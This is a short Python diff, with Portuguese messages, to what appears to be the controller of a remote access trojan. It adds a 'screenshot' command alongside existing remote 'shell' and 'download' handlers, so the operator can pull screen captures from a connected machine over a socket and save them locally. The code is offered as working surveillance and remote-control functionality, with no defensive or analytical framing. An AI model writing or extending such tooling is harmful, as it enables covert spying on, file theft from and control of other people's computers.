@@ -107,6 +107,18 @@ def download(s):
     else:
         print('Arquivo ' + arquivo +' não existe.')
 
+def screenshot(s):
+    s.send('5')
+    nome = s.recv(1024)
+    nome = nome.replace('/tmp/',os.environ['HOME']+'/Desktop/')
+    f = open(nome , 'wb')
+    l = s.recv(1024)
+    while(l):
+        f.write(l)
+        l = s.recv(1024)
+    f.close()
+    print('Screenshot salvo na sua area de trabalho')
+    
 def shell(s):
     s.send('2') # shell
     while True:
@@ -137,6 +149,8 @@ def identificador(comando, s):
             shell(s)
         elif(comando[0] == 'download'):
             download(s)
+        elif(comando[0] == 'screenshot'):
+            screenshot(s)
         elif(comando[0] == 'help' or comando[0] == 'ajuda'):
             ajuda()
         elif(comando[0] == 'clear'):
